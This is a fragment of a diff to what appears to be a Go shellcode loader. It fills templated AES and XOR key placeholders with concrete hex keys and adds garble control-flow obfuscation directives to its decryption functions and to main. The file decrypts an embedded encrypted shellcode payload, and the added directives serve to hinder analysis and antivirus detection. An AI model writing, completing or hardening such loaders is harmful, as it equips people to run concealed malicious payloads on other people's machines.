@@ -22,11 +22,12 @@ import (
 var encryptedShellcode []byte
 
 var (
-	aesKey, _    = hex.DecodeString("%KEYAES%")
-	xorKey, _    = hex.DecodeString("%KEYXOR%")
-	XORAESKey, _ = hex.DecodeString("%XORAESKEY%")
+	aesKey, _    = hex.DecodeString("d131cb517c2ca8b97b5bfc825f4c23b58a66cb572126fabe7b58a886534574b58b329a072827fbb97e08f9800b4e22ef8033cc517b24aabd2e59ff875b4872e4")
+	xorKey, _    = hex.DecodeString("d4609a507a76a9ef7752ff8c5a4b77e18367cf572c2ca8ee760aae835c1b74e2")
+	XORAESKey, _ = hex.DecodeString("b204f8321814cbdc4f6b9db46a7d47d7")
 )
 
+//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func verifyDataIntegrity(data []byte, stage string) bool {
 	log.Printf("[*] Verifying data integrity at stage: %s", stage)
 	if len(data) == 0 {
@@ -37,9 +38,11 @@ func verifyDataIntegrity(data []byte, stage string) bool {
 	return true
 }
 
+//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func aesDecrypt(ciphertext, key []byte) ([]byte, error) {
 	log.Printf("[*] Starting AES decryption - Input size: %d bytes", len(ciphertext))
 
+	// Ensure the decrypted AES key is of a valid size
 	if len(key) != 16 && len(key) != 24 && len(key) != 32 {
 		return nil, fmt.Errorf("[-] Invalid AES key size: %d bytes", len(key))
 	}
@@ -65,6 +68,7 @@ func aesDecrypt(ciphertext, key []byte) ([]byte, error) {
 	return ciphertext, nil
 }
 
+//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func xorDecrypt(data, key []byte) ([]byte, error) {
 	log.Printf("[*] Starting XOR decryption - Input size: %d bytes", len(data))
 
@@ -83,6 +87,7 @@ func xorDecrypt(data, key []byte) ([]byte, error) {
 	return data, nil
 }
 
+//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func decryptkey(data, key []byte) ([]byte, error) {
 	keyLen := len(key)
 	if keyLen == 0 {
@@ -96,6 +101,7 @@ func decryptkey(data, key []byte) ([]byte, error) {
 	return data, nil
 }
 
+//.garble:controlflow flatten_passes=3 junk_jumps=128 block_splits=max flatten_hardening=xor,delegate_table
 func main() {
 	log.SetFlags(0)
 
